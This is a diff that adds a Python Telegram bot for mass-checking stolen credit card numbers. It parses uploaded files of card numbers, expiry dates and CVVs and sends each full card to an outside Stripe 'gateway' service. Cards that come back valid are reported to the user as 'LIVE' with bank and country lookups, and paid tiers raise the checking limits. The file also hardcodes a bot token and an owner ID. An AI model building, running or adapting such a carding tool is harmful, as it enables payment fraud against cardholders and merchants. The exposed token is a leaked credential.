@@ -1,0 +1,393 @@
+import logging
+import sqlite3
+import time
+import requests
+import re
+import random
+import string
+import asyncio
+import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
+from datetime import datetime, timedelta
+
+# Bot Configuration
+TOKEN = "8540430646:AAE_yHlGpSziZBK9Jh0M_ta8LVUbJuzDb1A"
+OWNER_ID = 8292208664
+CHANNEL_USERNAME = "@RENXLEAKS" 
+
+# User Limits and Cooldowns
+FREE_LIMIT = 15
+PREMIUM_LIMIT = 150
+OWNER_LIMIT = 500
+COOLDOWN_TIME = 360
+
+user_files = {}
+active_checks = {}
+stop_controllers = {}
+
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+class MassCheckController:
+    def __init__(self, user_id):
+        self.user_id = user_id
+        self.should_stop = False
+        self.last_check_time = time.time()
+        self.active = True
+    
+    def stop(self):
+        self.should_stop = True
+        self.active = False
+        logger.info(f"FORCE STOPPED for user {self.user_id}")
+    
+    def should_continue(self):
+        self.last_check_time = time.time()
+        return not self.should_stop and self.active
+
+def init_db():
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, status TEXT, cooldown_until REAL, join_date REAL)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes (code TEXT PRIMARY KEY, days INTEGER, created_at REAL, used_by INTEGER)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS redeemed (user_id INTEGER, code TEXT, redeemed_at REAL, expires_at REAL)''')
+    c.execute("INSERT OR IGNORE INTO users (user_id, status, join_date) VALUES (?, ?, ?)", (OWNER_ID, "owner", time.time()))
+    conn.commit()
+    conn.close()
+
+def get_user_status(user_id):
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
+    result = c.fetchone()
+    if not result:
+        c.execute("INSERT INTO users (user_id, status, join_date) VALUES (?, ?, ?)", (user_id, "free", time.time()))
+        conn.commit()
+        status = "free"
+    else:
+        status = result[0]
+    if status == "premium":
+        c.execute("SELECT expires_at FROM redeemed WHERE user_id=?", (user_id,))
+        expiry = c.fetchone()
+        if expiry and time.time() > expiry[0]:
+            c.execute("UPDATE users SET status='free' WHERE user_id=?", (user_id,))
+            conn.commit()
+            status = "free"
+    conn.close()
+    return status
+
+def get_user_limit(user_id):
+    status = get_user_status(user_id)
+    if user_id == OWNER_ID: return OWNER_LIMIT
+    elif status == "premium": return PREMIUM_LIMIT
+    else: return FREE_LIMIT
+
+def is_on_cooldown(user_id):
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    c.execute("SELECT cooldown_until FROM users WHERE user_id=?", (user_id,))
+    result = c.fetchone()
+    conn.close()
+    if result and result[0]: return time.time() < result[0]
+    return False
+
+def set_cooldown(user_id):
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    cooldown_until = time.time() + COOLDOWN_TIME
+    c.execute("UPDATE users SET cooldown_until=? WHERE user_id=?", (cooldown_until, user_id))
+    conn.commit()
+    conn.close()
+
+async def check_channel_membership(user_id, context):
+    try:
+        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        return member.status not in ['left', 'kicked']
+    except: return False
+
+def simple_cc_parser(text):
+    valid_ccs = []
+    patterns = [r'(\d{13,19})[\|/\s:\-]+(\d{1,2})[\|/\s:\-]+(\d{2,4})[\|/\s:\-]+(\d{3,4})']
+    for pattern in patterns:
+        matches = re.findall(pattern, text)
+        for match in matches:
+            cc, month, year, cvv = match
+            if len(cc) < 13 or len(cc) > 19: continue
+            month = month.zfill(2)
+            if len(year) == 2: year = "20" + year
+            if cc.startswith(('34', '37')):
+                if len(cvv) != 4: continue
+            else:
+                if len(cvv) != 3: continue
+            valid_ccs.append((cc, month, year, cvv))
+    return valid_ccs
+
+def detect_card_type(cc_number):
+    if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', cc_number): return "VISA"
+    elif re.match(r'^5[1-5][0-9]{14}$', cc_number): return "MASTERCARD"
+    elif re.match(r'^3[47][0-9]{13}$', cc_number): return "AMEX"
+    elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', cc_number): return "DISCOVER"
+    elif re.match(r'^3(?:0[0-5]|[68][0-9])[0-9]{11}$', cc_number): return "DINERS CLUB"
+    elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', cc_number): return "JCB"
+    else: return "UNKNOWN"
+
+def bin_lookup(bin_number):
+    try:
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
+        if response.status_code == 200: return response.json()
+    except: pass
+    return {}
+
+# 🔥 FIXED CC CHECKER - MAIN FIX YAHAN HAI 🔥
+def check_cc(cc_number, month, year, cvv):
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}"
+    
+    try:
+        response = requests.get(url, timeout=35)
+        end_time = time.time()
+        process_time = round(end_time - start_time, 2)
+        
+        if response.status_code == 200:
+            response_text = response.text.strip().lower()
+            
+            # PRIORITY APPROVED KEYWORDS
+            approved_keywords = [
+                'approved', 'success', 'charged', 'payment added', 'live', 'valid',
+                'succeeded', 'transaction approved', 'payment successful', 
+                'authorization approved', 'ok', 'charge'
+            ]
+            
+            # DECLINE KEYWORDS
+            declined_keywords = [
+                'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
+                'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
+            ]
+            
+            # CHECK APPROVED FIRST
+            for keyword in approved_keywords:
+                if keyword in response_text:
+                    return "approved", process_time, response.text
+            
+            # CHECK DECLINED
+            for keyword in declined_keywords:
+                if keyword in response_text:
+                    return "declined", process_time, response.text
+            
+            # FALLBACK: Length check
+            if len(response.text.strip()) > 20:
+                return "approved", process_time, response.text
+            else:
+                return "declined", process_time, response.text
+        else:
+            return "declined", process_time, f"HTTP {response.status_code}"
+            
+    except: return "error", 0, "Error"
+
+def parse_cc_file(file_content):
+    try:
+        if isinstance(file_content, (bytes, bytearray)):
+            text_content = file_content.decode('utf-8', errors='ignore')
+        else:
+            text_content = str(file_content)
+        valid_ccs = simple_cc_parser(text_content)
+        return [f"{cc}|{month}|{year}|{cvv}" for cc, month, year, cvv in valid_ccs]
+    except: return []
+
+def create_status_buttons(user_id, current_cc, status, approved_count, declined_count, checked_count, total_to_check):
+    keyboard = [
+        [InlineKeyboardButton(f"𝘾𝙪𝙧𝙧𝙚𝙣𝙩 ➜ {current_cc[:8]}...", callback_data="current_info")],
+        [InlineKeyboardButton(f" 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}", callback_data="status_info")],
+        [InlineKeyboardButton(f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➜ {approved_count}", callback_data="approved_info")],
+        [InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {declined_count}", callback_data="declined_info")],
+        [InlineKeyboardButton(f"⏳ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ {checked_count}/{total_to_check}", callback_data="progress_info")],
+        [InlineKeyboardButton("☑️ 𝙎𝙏𝙊𝙋", callback_data=f"stop_check_{user_id}")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+async def handle_document(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if not await check_channel_membership(user_id, context):
+        await update.message.reply_text("❌ Join our channel first!")
+        return
+    
+    document = update.message.document
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please upload .txt file!")
+        return
+    
+    try:
+        await update.message.reply_text("𝘼𝙡𝙡 𝘾𝙘𝙨 𝘼𝙧𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜...")
+        file = await document.get_file()
+        file_content = await file.download_as_bytearray()
+        cc_list = parse_cc_file(file_content)
+        total_ccs = len(cc_list)
+        
+        if total_ccs == 0:
+            await update.message.reply_text("❌ No valid CCs found!\nFormat: 4147768578745265|04|2026|168")
+            return
+        
+        user_files[user_id] = {
+            'cc_list': cc_list, 'file_name': document.file_name,
+            'total_ccs': total_ccs, 'timestamp': time.time()
+        }
+        
+        user_limit = get_user_limit(user_id)
+        keyboard = [
+            [InlineKeyboardButton("🚀 Check Cards", callback_data=f"start_check_{user_id}")],
+            [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_check_{user_id}")]
+        ]
+        
+        message_text = f"""
+⏳ File Detected 
+
+✅ File ➜ `{document.file_name}`
+☑️ Cards ➜ `{total_ccs}`
+💎 Limit ➜ `{user_limit}`
+
+💎 By @Rendownfall
+        """
+        await update.message.reply_text(message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+
+async def handle_button(update: Update, context: CallbackContext):
+    query = update.callback_query
+    user_id = query.from_user.id
+    callback_data = query.data
+    await query.answer()
+    
+    if callback_data.startswith('start_check_'):
+        target_user_id = int(callback_data.split('_')[2])
+        if user_id != target_user_id:
+            await query.message.reply_text("❌ Not your file!")
+            return
+        await start_card_check(query, context, user_id)
+        
+    elif callback_data.startswith('stop_check_'):
+        target_user_id = int(callback_data.split('_')[2])
+        if user_id != target_user_id:
+            await query.answer("❌ Not your check!", show_alert=True)
+            return
+        
+        if target_user_id in stop_controllers:
+            stop_controllers[target_user_id].stop()
+        if target_user_id in active_checks:
+            active_checks[target_user_id] = False
+        if target_user_id in user_files:
+            user_files[target_user_id]['force_stop'] = True
+            
+        await query.edit_message_text("🛑 **STOPPED!** Ready for new file!")
+        
+    elif callback_data.startswith('cancel_check_'):
+        target_user_id = int(callback_data.split('_')[2])
+        if user_id == target_user_id and user_id in user_files:
+            del user_files[user_id]
+        await query.edit_message_text("❌ Cancelled!")
+
+# 🔥 FIXED MAIN CHECK FUNCTION 🔥
+async def start_card_check(query, context: CallbackContext, user_id: int):
+    if user_id not in user_files:
+        await query.edit_message_text("❌ No file found!")
+        return
+    if is_on_cooldown(user_id):
+        await query.edit_message_text("⏳ Cooldown active!")
+        return
+    
+    file_data = user_files[user_id]
+    cc_list = file_data['cc_list']
+    total_ccs = file_data['total_ccs']
+    user_limit = get_user_limit(user_id)
+    total_to_check = min(total_ccs, user_limit)
+    
+    set_cooldown(user_id)
+    
+    stop_controller = MassCheckController(user_id)
+    stop_controllers[user_id] = stop_controller
+    active_checks[user_id] = True
+    user_files[user_id]['force_stop'] = False
+    
+    status_text = "🚀 Mass Check Started!"
+    reply_markup = create_status_buttons(user_id, "Starting...", "Init", 0, 0, 0, total_to_check)
+    status_msg = await query.edit_message_text(status_text, reply_markup=reply_markup)
+    
+    approved_count = declined_count = checked_count = 0
+    start_time = time.time()
+    
+    for index, cc_data in enumerate(cc_list[:user_limit]):
+        if (not stop_controller.should_continue() or 
+            user_id not in active_checks or not active_checks[user_id] or
+            user_files[user_id].get('force_stop', False)):
+            break
+            
+        checked_count = index + 1
+        try:
+            cc_number, month, year, cvv = cc_data.split('|')
+            
+            status_text = f"🔥 Checking `{cc_number[:8]}...`"
+            reply_markup = create_status_buttons(user_id, cc_number, "Checking...", 
+                                               approved_count, declined_count, 
+                                               checked_count, total_to_check)
+            await status_msg.edit_text(status_text, reply_markup=reply_markup, parse_mode='Markdown')
+            
+            status, process_time, api_response = check_cc(cc_number, month, year, cvv)
+            
+            if status == "approved":
+                approved_count += 1
+                bin_info = bin_lookup(cc_number[:6])
+                
+                approved_text = f"""
+🎉 **LIVE!** 🎉
+
+**CC:** `{cc_number}|{month}|{year}|{cvv}`
+**Gateway:** Stripe
+**Time:** {process_time}s
+
+**BIN:**
+- {bin_info.get('brand', 'N/A')}
+- {bin_info.get('bank', 'N/A')}
+- {bin_info.get('country_name', 'N/A')}
+
+**@Rendownfall**
+                """
+                await context.bot.send_message(user_id, approved_text, parse_mode='Markdown')
+                
+            else:
+                declined_count += 1
+                
+        except Exception as e:
+            declined_count += 1
+    
+    total_time = round(time.time() - start_time, 1)
+    final_text = f"""
+✅ **COMPLETE!**
+
+📊 Results:
+- Checked: {checked_count}/{total_to_check}
+- ✅ Approved: {approved_count}
+- ❌ Declined: {declined_count}
+⏱️ {total_time}s
+
+**@Rendownfall**
+    """
+    
+    await status_msg.edit_text(final_text, parse_mode='Markdown')
+    
+    # Cleanup
+    for key in [stop_controllers, active_checks]:
+        if user_id in key: del key[user_id]
+
+def main():
+    init_db()
+    app = Application.builder().token(TOKEN).build()
+    
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(CallbackQueryHandler(handle_button))
+    
+    print("Bot Started!")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
